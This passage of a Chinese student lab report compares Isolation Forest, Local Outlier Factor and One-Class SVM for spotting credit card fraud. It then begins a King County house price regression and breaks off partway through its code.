<p>(3) 检测数据异常值：在数据挖掘的过程中，数据异常值可能会对模型的准确性和稳定性产生负面影响。因此，检测和处理数据中的异常值是数据预处理的重要步骤之一。<br>常见的数据异常值检测方法包括孤立森林（Isolation Forest）、局部异常因子（Local Outlier Factor）和支持向量机（Support Vector Machine）等。这些方法利用数据的统计特性、密度、距离或边界来识别与大多数数据点明显不同的数据点。<br>通过使用这些异常值检测方法，我们可以标识出数据中的异常值，并进行进一步的处理，例如删除异常值、替换为缺失值或使用其他方法进行修正。这样可以提高数据质量，减少异常值对数据挖掘模型的影响，从而获得更准确和可靠的分析结果。</p>
<h1 id="三、实验内容和步骤"><a href="#三、实验内容和步骤" class="headerlink" title="三、实验内容和步骤"></a>三、实验内容和步骤</h1><h2 id="1-实验内容"><a href="#1-实验内容" class="headerlink" title="(1)实验内容"></a>(1)实验内容</h2><ol>
<li>用Python编写程序工具编写程序，实现数据清理、检查数据特征等功能，并在实验报告中写出主要的过程和采用的方法。</li>
<li>通过一些模型来检测数据的异常值</li>
</ol>
<h2 id="2-实验步骤"><a href="#2-实验步骤" class="headerlink" title="(2)实验步骤"></a>(2)实验步骤</h2><ol>
<li>导入库</li>
<li>读取数据</li>
<li>检查缺失值</li>
<li>检查分类数据<br> 4.1查看数据的基本统计描述<br> 4.2绘制交易金额分布柱状图<br> 4.3绘制交易时间与交易量分布图<br> 4.4抽取数据样本观察分布<br> 4.5相关性分析</li>
<li>模型建立与分析<br> 5.1数据准备<br> 5.2模型与分析<br> 5.3模型比较</li>
</ol>
<p>具体步骤：</p>
<h3 id="1-导入库"><a href="#1-导入库" class="headerlink" title="1.导入库"></a>1.导入库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> warnings <span class="keyword">import</span> filterwarnings </span><br><span class="line">filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np </span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> sklearn</span><br><span class="line"><span class="keyword">import</span> scipy</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> classification_report,accuracy_score</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> IsolationForest</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> LocalOutlierFactor</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> OneClassSVM</span><br><span class="line"><span class="keyword">from</span> pylab <span class="keyword">import</span> rcParams</span><br><span class="line">rcParams[<span class="string">&#x27;figure.figsize&#x27;</span>] = <span class="number">14</span>, <span class="number">8</span></span><br><span class="line">RANDOM_SEED = <span class="number">42</span></span><br><span class="line">LABELS = [<span class="string">&quot;Normal&quot;</span>, <span class="string">&quot;Fraud&quot;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="2-读取数据"><a href="#2-读取数据" class="headerlink" title="2.读取数据"></a>2.读取数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = pd.read_csv(<span class="string">&#x27;../Dataset/creditcard.csv&#x27;</span>,sep=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">data.head()</span><br></pre></td></tr></table></figure>
<p>结果：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042342279.png"></p>
<h3 id="3-检查缺失值"><a href="#3-检查缺失值" class="headerlink" title="3.检查缺失值"></a>3.检查缺失值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.isnull().values.<span class="built_in">any</span>()</span><br></pre></td></tr></table></figure>
<p>输出：False<br>说明该数据集中不存在缺失值</p>
<p>粗看数据分类占比</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">count_classes = pd.value_counts(data[<span class="string">&#x27;Class&#x27;</span>], sort = <span class="literal">True</span>)</span><br><span class="line">count_classes.plot(kind = <span class="string">&#x27;bar&#x27;</span>, rot=<span class="number">0</span>)</span><br><span class="line">LABELS = [<span class="string">&quot;Normal&quot;</span>, <span class="string">&quot;Fraud&quot;</span>]</span><br><span class="line">plt.title(<span class="string">&quot;Transaction Class Distribution&quot;</span>)</span><br><span class="line">plt.xticks(<span class="built_in">range</span>(<span class="number">2</span>), LABELS)</span><br><span class="line">plt.xlabel(<span class="string">&quot;Class&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;Frequency&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042342280.png"></p>
<h3 id="4-检查分类数据"><a href="#4-检查分类数据" class="headerlink" title="4.检查分类数据"></a>4.检查分类数据</h3><h4 id="4-1查看数据的基本统计描述"><a href="#4-1查看数据的基本统计描述" class="headerlink" title="4.1查看数据的基本统计描述"></a>4.1查看数据的基本统计描述</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fraud = data[data[<span class="string">&#x27;Class&#x27;</span>]==<span class="number">1</span>]</span><br><span class="line">normal = data[data[<span class="string">&#x27;Class&#x27;</span>]==<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(fraud.shape,normal.shape)</span><br></pre></td></tr></table></figure>
<p>输出被诈骗数据以及正常数据的维度：(492, 31) (284315, 31)<br>从中看出正常数据有284315条，而被诈骗数据仅仅有492条。</p>
<p>查看正常数据以及被诈骗数据的基本统计量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fraud.Amount.describe()</span><br></pre></td></tr></table></figure>
<p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042342281.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">normal.Amount.describe()</span><br></pre></td></tr></table></figure>
<p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042342282.png" alt="image.png"></p>
<p>&#96;</p>
<h4 id="4-2绘制交易金额分布柱状图"><a href="#4-2绘制交易金额分布柱状图" class="headerlink" title="4.2绘制交易金额分布柱状图"></a>4.2绘制交易金额分布柱状图</h4><p>按类别列出的每笔交易的金额，据此分别绘制柱状图，观察数据分布。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">f, (ax1, ax2) = plt.subplots(<span class="number">2</span>, <span class="number">1</span>, sharex=<span class="literal">True</span>)</span><br><span class="line">f.suptitle(<span class="string">&#x27;Amount per transaction by class&#x27;</span>)</span><br><span class="line">bins = <span class="number">50</span></span><br><span class="line"></span><br><span class="line">ax1.hist(fraud.Amount, bins = bins)</span><br><span class="line">ax1.set_title(<span class="string">&#x27;Fraud&#x27;</span>)</span><br><span class="line">ax2.hist(normal.Amount, bins = bins)</span><br><span class="line">ax2.set_title(<span class="string">&#x27;Normal&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Amount ($)&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Number of Transactions&#x27;</span>)</span><br><span class="line">plt.xlim((<span class="number">0</span>, <span class="number">20000</span>))</span><br><span class="line">plt.yscale(<span class="string">&#x27;log&#x27;</span>)</span><br><span class="line">plt.show();</span><br></pre></td></tr></table></figure>

<p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042342284.png" alt="image.png"></p>
<h4 id="4-3绘制交易时间与交易量分布图"><a href="#4-3绘制交易时间与交易量分布图" class="headerlink" title="4.3绘制交易时间与交易量分布图"></a>4.3绘制交易时间与交易量分布图</h4><p>将检查欺诈交易是否在特定时间段内更频繁发生，用数据可视化——点状图来直观分析。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">f, (ax1, ax2) = plt.subplots(<span class="number">2</span>, <span class="number">1</span>, sharex=<span class="literal">True</span>)</span><br><span class="line">f.suptitle(<span class="string">&#x27;Time of transaction vs Amount by class&#x27;</span>)</span><br><span class="line">ax1.scatter(fraud.Time, fraud.Amount)</span><br><span class="line">ax1.set_title(<span class="string">&#x27;Fraud&#x27;</span>)</span><br><span class="line">ax2.scatter(normal.Time, normal.Amount)</span><br><span class="line">ax2.set_title(<span class="string">&#x27;Normal&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Time (in Seconds)&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Amount&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>输出的点状图如下：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042342285.png" alt="image.png"></p>
<h4 id="4-4抽取数据样本观察分布"><a href="#4-4抽取数据样本观察分布" class="headerlink" title="4.4抽取数据样本观察分布"></a>4.4抽取数据样本观察分布</h4><p>通过在总体数据集中随机抽取一定量(10%)的样本，来观察样本中正常数据与被诈骗数据的分布情况。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">data1= data.sample(frac = <span class="number">0.1</span>,random_state=<span class="number">1</span>)</span><br><span class="line">data1.shape</span><br><span class="line"></span><br><span class="line">Fraud = data1[data1[<span class="string">&#x27;Class&#x27;</span>]==<span class="number">1</span>]</span><br><span class="line">Valid = data1[data1[<span class="string">&#x27;Class&#x27;</span>]==<span class="number">0</span>]</span><br><span class="line">outlier_fraction = <span class="built_in">len</span>(Fraud)/<span class="built_in">float</span>(<span class="built_in">len</span>(Valid))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(outlier_fraction)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Fraud Cases : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(Fraud)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Valid Cases : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(Valid)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输出结果如下：<br><code>0.0017234102419808666 </code><br><code>Fraud Cases : 49  </code>Valid Cases : 28432&#96;<br>得出样本数据中，欺诈交易数量与有效（正常）交易数量之比为0.0017234102419808666。可见欺诈交易占比之小。</p>
<h4 id="4-5相关性分析"><a href="#4-5相关性分析" class="headerlink" title="4.5相关性分析"></a>4.5相关性分析</h4><p>通过以下代码，获取数据集中每个特征的相关性，并绘制出相关性的图像。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line">corrmat = data1.corr()</span><br><span class="line">top_corr_features = corrmat.index</span><br><span class="line">plt.figure(figsize=(<span class="number">26</span>,<span class="number">26</span>))</span><br><span class="line">g=sns.heatmap(data[top_corr_features].corr(),annot=<span class="literal">True</span>,cmap=<span class="string">&quot;RdYlGn&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>图像如下：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042342286.png" alt="image.png"></p>
<h3 id="5-模型建立与分析"><a href="#5-模型建立与分析" class="headerlink" title="5.模型建立与分析"></a>5.模型建立与分析</h3><h4 id="5-1数据准备"><a href="#5-1数据准备" class="headerlink" title="5.1数据准备"></a>5.1数据准备</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">columns = data1.columns.tolist()</span><br><span class="line">columns = [c <span class="keyword">for</span> c <span class="keyword">in</span> columns <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;Class&quot;</span>]]</span><br><span class="line">target = <span class="string">&quot;Class&quot;</span></span><br><span class="line"></span><br><span class="line">state = np.random.RandomState(<span class="number">42</span>)</span><br><span class="line">X = data1[columns]</span><br><span class="line">Y = data1[target]</span><br><span class="line">X_outliers = state.uniform(low=<span class="number">0</span>, high=<span class="number">1</span>, size=(X.shape[<span class="number">0</span>], X.shape[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(X.shape)</span><br><span class="line"><span class="built_in">print</span>(Y.shape)</span><br></pre></td></tr></table></figure>

<h4 id="5-2模型与分析"><a href="#5-2模型与分析" class="headerlink" title="5.2模型与分析"></a>5.2模型与分析</h4><p>为了检测数据集中的异常值或离群点，将分别使用以下三个模型进行检测：<strong>孤立森林（Isolation Forest）、局部异常因子（Local Outlier Factor）与局部异常因子（Local Outlier Factor）</strong></p>
<ol>
<li><p><strong>孤立森林（Isolation Forest）</strong>：这是一种基于树的模型，用于异常值检测。它的工作原理是随机选择一个特征，然后随机选择一个分割值，将数据分为两部分。这个过程重复进行，形成了一个“森林”。孤立森林认为那些容易被孤立的点是异常值。</p>
</li>
<li><p><strong>局部异常因子（Local Outlier Factor）</strong>：这是一种基于邻近性的方法，用于异常值检测。它比较了一个点和其邻居的局部密度，如果一个点的局部密度远低于其邻居，那么这个点就被认为是异常值。</p>
</li>
<li><p><strong>支持向量机（Support Vector Machine）</strong>：这是一种基于边界的方法，用于异常值检测。在这种情况下，它被配置为一个单类支持向量机（One-Class SVM），这意味着它试图找到数据的“正常”边界，然后将那些在边界之外的点视为异常值。</p>
</li>
</ol>
<p>以下是定义了三个模型检测方法的一个字典序列：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">classifiers = &#123;</span><br><span class="line">    <span class="string">&quot;Isolation Forest&quot;</span>:IsolationForest(n_estimators=<span class="number">100</span>, max_samples=<span class="built_in">len</span>(X),</span><br><span class="line">                                       contamination=outlier_fraction,random_state=state, verbose=<span class="number">0</span>),</span><br><span class="line">    <span class="string">&quot;Local Outlier Factor&quot;</span>:LocalOutlierFactor(n_neighbors=<span class="number">20</span>, algorithm=<span class="string">&#x27;auto&#x27;</span>,leaf_size=<span class="number">30</span>, metric=<span class="string">&#x27;minkowski&#x27;</span>,p=<span class="number">2</span>, metric_params=<span class="literal">None</span>, contamination=outlier_fraction),</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;Support Vector Machine&quot;</span>:OneClassSVM(kernel=<span class="string">&#x27;rbf&#x27;</span>, degree=<span class="number">3</span>, gamma=<span class="number">0.1</span>,nu=<span class="number">0.05</span>,max_iter=-<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-3模型比较"><a href="#5-3模型比较" class="headerlink" title="5.3模型比较"></a>5.3模型比较</h4><p>将从模型的误差精确度、召回率、f1-score等方面对三个模型进行比较。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">n_outliers = <span class="built_in">len</span>(Fraud)</span><br><span class="line"><span class="keyword">for</span> i, (clf_name,clf) <span class="keyword">in</span> <span class="built_in">enumerate</span>(classifiers.items()):</span><br><span class="line">    <span class="comment">#Fit the data and tag outliers</span></span><br><span class="line">    <span class="keyword">if</span> clf_name == <span class="string">&quot;Local Outlier Factor&quot;</span>:</span><br><span class="line">        y_pred = clf.fit_predict(X)</span><br><span class="line">        scores_prediction = clf.negative_outlier_factor_</span><br><span class="line">    <span class="keyword">elif</span> clf_name == <span class="string">&quot;Support Vector Machine&quot;</span>:</span><br><span class="line">        clf.fit(X)</span><br><span class="line">        y_pred = clf.predict(X)</span><br><span class="line">    <span class="keyword">else</span>:    </span><br><span class="line">        clf.fit(X)</span><br><span class="line">        scores_prediction = clf.decision_function(X)</span><br><span class="line">        y_pred = clf.predict(X)</span><br><span class="line">    <span class="comment">#Reshape the prediction values to 0 for Valid transactions , 1 for Fraud transactions</span></span><br><span class="line">    y_pred[y_pred == <span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">    y_pred[y_pred == -<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">    n_errors = (y_pred != Y).<span class="built_in">sum</span>()</span><br><span class="line">    <span class="comment"># Run Classification Metrics</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(clf_name,n_errors))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Accuracy Score :&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(accuracy_score(Y,y_pred))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Classification Report :&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(classification_report(Y,y_pred))</span><br></pre></td></tr></table></figure>
<p>该代码使用前面定义的三种异常检测方法（孤立森林、局部异常因子、单类支持向量机）来预测数据集中的异常值，并计算每种方法的预测错误数、准确度和分类报告。</p>
<p><strong>结论：</strong><br>在精确度方面，Isolation Forest为99.74%比Local Outlier Factor的99.66%和Support Vector Machine的70.09%都要高。<br>在召回率方面，Isolation Forest模型依然是最优的，其召回率为27%，而Local Outlier Factor的召回率为2%，Support Vector Machine仅为0%。<br>因此，整体上，Isolation Forest在确定欺诈交易方面表现得更好。</p>
<h1 id="四、实验结果"><a href="#四、实验结果" class="headerlink" title="四、实验结果"></a>四、实验结果</h1><p>首先，通过检查缺失值、检查分类数据等数据预处理步骤，对数据进行一个初步处理与了解。<br>然后，通过模型的建立与分析，对比了三种模型：solation Forest、Local Outlier Factor和Support Vector Machine，在检测异常值方面的优劣。<br>最终，得出loslation Forest模型在确定欺诈交易方面表现得更好。</p>
<h1 id="五、实验分析"><a href="#五、实验分析" class="headerlink" title="五、实验分析"></a>五、实验分析</h1><p>此次实验，在三个模型上进行了优劣对比，往后可以考虑用更多的模型来进行对比，以此来获得更加切合，表现更为优秀的模型。</p>
<h1 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h1><h1 id="一、实验目的-1"><a href="#一、实验目的-1" class="headerlink" title="一、实验目的"></a>一、实验目的</h1><p>(1) 编写程序，实现房价的预测模型的建立。<br>(2) 调用建立的模型，进行未知房价地区的房价预测。<br>(3) 写出实验报告。</p>
<h1 id="二、实验原理-1"><a href="#二、实验原理-1" class="headerlink" title="二、实验原理"></a>二、实验原理</h1><p>(1)数据预处理：对原始数据进行清洗、缺失值处理、特征工程等预处理步骤，以获得可用于建模的数据集。</p>
<p>(2)模型选择和训练：选取多个线性回归模型作为候选模型，例如多元线性回归模型、递归特征消除、交叉验证的递归特征消除等。针对每个模型，使用训练数据集进行模型训练。</p>
<p>(3)模型评估：使用测试数据集评估每个模型的性能，计算评价指标如均方根误差（RMSE）、决定系数（R-squared）等，以衡量模型的预测能力。</p>
<p>(4)模型比较与选择：比较不同模型的性能和特点，考虑各个模型的优缺点，选择最佳的模型作为最终的房价预测模型。</p>
<h1 id="三、实验内容和步骤-1"><a href="#三、实验内容和步骤-1" class="headerlink" title="三、实验内容和步骤"></a>三、实验内容和步骤</h1><h2 id="1-实验内容-1"><a href="#1-实验内容-1" class="headerlink" title="(1)实验内容"></a>(1)实验内容</h2><ol>
<li>首先，检查数据的完整性，并进行方差分析和韦尔奇T检验等统计检验，以发现数据中的显著性。研究发现，该物业的邮政编码、重建状况、地下室的存在以及物业的状况是影响物业价值的重要因素。</li>
<li>其次，设计了许多功能来增强线性回归建模。一些特征被重新创建为伯努利分布，用作分类数据，例如主浴室的存在。卧室和浴室等普通价值也被平方，以强调多个浴室和卧室对房地产价格的影响。</li>
<li>最后，以统计模型OLS方法为基线，建立了四个线性回归模型。该模型主要基于工程特性。然后，从Scikit Learn库中创建了三个模型：基本线性回归、具有递归特征消除的线性回归以及具有递归特征去除和交叉验证的线性回归。通过系数分析，确定具有递归特征消除的线性回归模型是最稳定的模型，并选择它进行最终实现。</li>
</ol>
<h2 id="2-实验步骤-1"><a href="#2-实验步骤-1" class="headerlink" title="(2)实验步骤"></a>(2)实验步骤</h2><ol>
<li>库和数据的导入</li>
<li>探索性数据分析</li>
<li>特征工程（Feature Engineering）</li>
<li>线性回归模型选择</li>
<li>模型导出</li>
<li>预测（模型的使用）</li>
</ol>
<p>具体步骤：</p>
<h3 id="1-库和数据的导入"><a href="#1-库和数据的导入" class="headerlink" title="1.库和数据的导入"></a>1.库和数据的导入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> scipy.stats <span class="keyword">as</span> stats</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">import</span> plotly.express <span class="keyword">as</span> px</span><br><span class="line"><span class="keyword">import</span> geopandas <span class="keyword">as</span> gpd</span><br><span class="line"><span class="keyword">import</span> statsmodels.api <span class="keyword">as</span> sm</span><br><span class="line"><span class="keyword">import</span> statsmodels.formula.api <span class="keyword">as</span> smf</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> RFE, RFECV</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">%matplotlib inline</span><br><span class="line">pd.options.display.max_columns = <span class="number">500</span></span><br><span class="line">pd.options.display.max_rows = <span class="number">500</span></span><br><span class="line"></span><br><span class="line">kc_df = pd.read_csv(<span class="string">&quot;../../Dataset/kc_house_data_train.csv&quot;</span>, index_col=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="2-探索性数据分析"><a href="#2-探索性数据分析" class="headerlink" title="2.探索性数据分析"></a>2.探索性数据分析</h3><p>为了便于理解，本节将对数据进行可视化，然后对数据中的实证结果进行适当的统计分析。<br>以下是本节中回答的问题的摘要：</p>
<ol>
<li>哪个街区拥有最有价值的房产？</li>
<li>房产状况是否会影响价值？</li>
</ol>
<ul>
<li>房产年龄和状况是否相关？</li>
</ul>
<ol start="3">
<li>哪些功能为房子增值？</li>
</ol>
<ul>
<li>翻修会增加房地产价值吗？</li>
<li>地下室能增加房地产价值吗？</li>
</ul>
<h4 id="2-1检查数据完整性"><a href="#2-1检查数据完整性" class="headerlink" title="2.1检查数据完整性"></a>2.1检查数据完整性</h4><p>检查数据集中是否存在缺失值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">total_null = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> null_count <span class="keyword">in</span> kc_df.isnull().<span class="built_in">sum</span>():</span><br><span class="line">    total_null += null_count</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;There are total <span class="subst">&#123;total_null&#125;</span> null values in the data&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>输出：<code>here are total 0 null values in the data</code><br>说明该数据集中不存在缺失值，数据集完整。</p>
<p>由于数据集包含连续值和分类值的混合，许多列包含与基本统计分析无关的分类值，因此选择我们需要的列来分析数据。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">summary_features = [<span class="string">&quot;price&quot;</span>, <span class="string">&quot;yr_built&quot;</span>, <span class="string">&quot;bedrooms&quot;</span>, <span class="string">&quot;bathrooms&quot;</span>, <span class="string">&quot;sqft_living&quot;</span>, <span class="string">&quot;sqft_lot&quot;</span>,<span class="string">&quot;floors&quot;</span>, <span class="string">&quot;condition&quot;</span>, <span class="string">&quot;grade&quot;</span>, <span class="string">&quot;sqft_living15&quot;</span>, <span class="string">&quot;sqft_lot15&quot;</span>]</span><br><span class="line">kc_df[summary_features].describe()</span><br></pre></td></tr></table></figure>
<p>截取所需列后的数据概述如下：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345966.png" alt="image.png"></p>
<h4 id="2-2列分析"><a href="#2-2列分析" class="headerlink" title="2.2列分析"></a>2.2列分析</h4><p>-<strong>价格</strong><em>-价格有2个数量级的巨大差距。将需要进一步的分析，特别是针对销售日期。<br>-<strong>yr_builded</strong>-数据集包含从1900年到2015年构建的构建。<br>-<strong>间卧室</strong>-0间卧室表示单间公寓，大多数住宅包含4间或更少的卧室，并有一些极端的异常值。<br>-<strong>浴室</strong>-惊讶地发现，有些家庭没有浴室。大多数人似乎至少有一个3&#x2F;4的浴室。<br>-<strong>sqft_living</strong>-从小公寓到豪宅，居住区也有很大的差异。<br>-<strong>sqft_lot</strong>-类似于上面的sqft_living。<br>-<strong>层</strong></em>-有一半的楼层需要考虑，它们是不跨越房子整体的顶层。<br>-<strong>条件</strong>-售出的平均房产售价为3.4（可能需要表面修复）。<br>-<strong>等级</strong>-金县的平均等级为7，这意味着平均房产的销售等级略高于平均等级。<br>-<strong>sqft_living15</strong>-相邻属性的大小往往相似（与sqft_lving的趋势相似）-<strong>sqft_lot15</strong>-与上面的sqft_ling15相似</p>
<h4 id="2-3分析哪个街区拥有最高房价？"><a href="#2-3分析哪个街区拥有最高房价？" class="headerlink" title="2.3分析哪个街区拥有最高房价？"></a>2.3分析哪个街区拥有最高房价？</h4><p>通过邮政编码，对不同街区的房价进行统计分析，获取最高房价的几个街区，以下是具体实现代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#property values by zipcode calculation</span></span><br><span class="line">kc_top5_price = kc_df.groupby(<span class="string">&quot;zipcode&quot;</span>)[<span class="string">&quot;price&quot;</span>].mean().sort_values(ascending = <span class="literal">False</span>)[:<span class="number">5</span>]</span><br><span class="line">kc_mean_price = kc_df.price.mean()</span><br><span class="line"><span class="comment">#top5 neighborhood label for plot</span></span><br><span class="line">area_labels = [<span 